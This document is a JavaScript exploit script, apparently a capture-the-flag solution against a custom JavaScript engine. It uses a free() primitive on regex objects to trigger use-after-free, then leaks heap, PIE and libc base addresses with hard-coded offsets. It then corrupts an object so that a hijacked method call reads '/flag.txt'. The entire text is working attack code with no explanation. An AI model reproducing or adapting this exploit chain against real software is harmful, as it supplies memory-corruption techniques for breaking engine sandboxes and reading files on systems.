var m = []
for(var i = 0;i<212;i++){
	m.push({})
}
function leakToInt(s){
	var leakLow = 0;
	var leakHigh = 0;

	var added = 0;
	s = encodeURIComponent(s)
	for(var i=0;i<s.length;i++,added++){
		var v 
		if(s[i] == '%'){
			v = (parseInt(s.slice(i+1,i+3),16)) 
			i += 2
		} else {
			v = s.slice(i,i+1).charCodeAt(0)
		}
		if(added < 3){
			leakLow += v << ((added)*8)
		} else if(added < 6) {
			leakHigh += v << ((added-3)*8)
		}
	}		
	return [leakHigh,leakLow]
}

function encInt(low,high){
	low = low.toString(16)
	high = high.toString(16)
	end = ''

	for(var i=low.length-2;i>-2;i-=2){
		end += '%'+low.slice(i,i+2)
	}
	for(var i=high.length-2;i>-2;i-=2){
		end += '%'+high.slice(i,i+2)
	}
	return decodeURIComponent(end)
}

var v = '\x08\x08\x08\x08\x08\x08\x08\x08\x08\x08\x08\x08\x08\x08\x08\x08\x08\x08\x08\x08\x08\x08\x08\x08\x08\x08\x08\x08\x08\x08\x08' 
var a = /A/
var b = /A/
free(a)
free(b)
v.toLowerCase()

a.toString = String.prototype.toString
var heapleak = leakToInt(a.toString())
print('HeapLeak: 0x'+heapleak[0].toString(16)+heapleak[1].toString(16) )


var c = /A/
var d = /A/
free(c)
free(d)
var e = ['','','','','','']
free(c)
var f = /A/
heapleak[1] -= heapleak[1] & 0xfff
heapleak[1] += 0x2b0
var pieBase = null
for(var i=0;i<10000;i++){
	heapleak[1] -= 0x1000
	e[4] = encInt(heapleak[1],heapleak[0]).trim()
	pieBase = leakToInt(c.toString().slice(1,-1))
	if( (pieBase[1]&0xff) == 185) break;
}
pieBase[1] -= 0x302b9
print('Piebase: 0x'+pieBase[0].toString(16)+pieBase[1].toString(16) )

e[4] = encInt(pieBase[1]+0x4edf0,pieBase[0]).trim()
libcbase = leakToInt(c.toString().slice(1,-1))
libcbase[1] -= 0x1a1080
print('Libcbase: 0x'+libcbase[0].toString(16)+libcbase[1].toString(16) )

heapleak[1] += 0x8010-0x2b0

// readline()
e[1] = '\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01'.trim()
e[2] = ('PPPPPPPPPPPPPP').trim()
e[3] = ('PPPPPPPPPPPPPP').trim()

e[4] = ('PPPPPPPP'+encInt(heapleak[1],heapleak[0])).trim()
c[0] = encInt(pieBase[1]+0x3a45b,pieBase[0]).trim()
// c[0] = encInt(pieBase[1]-0x1000,pieBase[0]).trim()
print(a['toLocaleString']('/flag.txt'))

quit(0)

